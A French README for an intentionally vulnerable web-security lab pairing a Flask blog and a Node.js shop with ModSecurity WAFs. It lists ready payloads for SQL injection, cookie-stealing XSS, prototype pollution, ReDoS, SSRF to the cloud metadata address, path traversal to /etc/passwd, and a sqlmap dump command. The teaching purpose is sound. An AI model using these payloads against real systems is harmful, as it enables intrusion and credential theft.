# 🛡️ Lab Sécurité Web — SecureBlog + TechMart

> Deux applications vulnérables, deux WAF ModSecurity.
> **Usage strictement pédagogique — NE PAS déployer en production.**

---

## 🗺️ Architecture du lab

```
Port  80  → WAF TechMart  → TechMart   (Node.js)  AVEC protection
Port 3000 → TechMart direct            (Node.js)  SANS protection
Port 8080 → WAF SecureBlog → SecureBlog (Flask)   AVEC protection
Port 5000 → SecureBlog direct           (Flask)   SANS protection
```

---

## 🚀 Démarrage (3 commandes)

```bash
cd secureblog
docker compose up -d --build
docker compose ps
```

---

## 🧪 Vulnérabilités & Payloads

### ATTAQUE 1 — SQLi Bypass Auth
**URL :** /login (les deux apps)
```
Username: admin' --    Password: (n'importe quoi)
Username: ' OR '1'='1' --
```

### ATTAQUE 2 — SQLi UNION Extract
**URL :** /products?q= (Node) ou /search?q= (Flask)
```
Utilisateurs : %' UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13 FROM users --
Données secrètes : %' UNION SELECT 1,label,value,4,5,6,7,8,9,10,11,12,13 FROM secret_data --
Flask (4 col) : %' UNION SELECT 1,username,password,role FROM users --
```

### ATTAQUE 3 — XSS Réfléchi
**URL :** /products?q= ou /search?q=
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### ATTAQUE 4 — XSS Stocké
**URL :** /product/1 (avis) ou /post/1 (commentaires)
```html
<script>alert('XSS Stocké !')</script>
<img src=x onerror="alert('cookie: '+document.cookie)">
```

### ATTAQUE 5 — XSS DOM
**URL :** /profile?name=
```
/profile?name=<img src=x onerror=alert(1)>
/profile?name=<svg/onload=alert(document.cookie)>
```

### ATTAQUE 6 — Prototype Pollution (Node uniquement)
**URL :** POST /profile/update
```json
{"__proto__": {"isAdmin": true, "role": "admin"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### ATTAQUE 7 — ReDoS (Node uniquement)
**URL :** /coupon
```
Payload : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
(50 'A' + '!' = blocage du thread Node.js pendant ~30s)
```

### ATTAQUE 8 — SSRF (Node uniquement)
**URL :** POST /order/1/track (webhook_url=)
```
http://app:5000/           → Service Flask interne
http://localhost:3000/admin → Admin Node local
http://169.254.169.254/latest/meta-data/
```

### ATTAQUE 9 — Path Traversal (Node uniquement)
**URL :** /download/file?file=
```
?file=../app.js
?file=../../etc/passwd
?file=../../proc/version
?file=../files/.env.production
```

---

## 🛡️ Activer le blocage WAF

Dans docker-compose.yml, changer pour les deux services waf :
```yaml
MODSECURITY_SEC_RULE_ENGINE: "On"   # était "DetectionOnly"
```
Puis : `docker compose up -d waf waf-flask`

---

## 📋 Comptes de test

| Username | Password | Rôle |
|---|---|---|
| admin | Admin@TechMart2024 | admin |
| alice | alice123 | user |
| bob | bob456 | user |
| charlie | charlie789 | user |

SecureBlog : admin / Admin@1234

---

## 🔧 Commandes utiles

```bash
docker compose logs -f waf          # Logs WAF TechMart
docker compose logs -f waf-flask    # Logs WAF SecureBlog
docker compose down -v              # Reset complet (efface les BDD)
sqlmap -u "http://localhost:3000/products?q=test" --batch --dump
```

*Lab Sécurité Web — 9 vulnérabilités, 2 apps, 2 WAF*
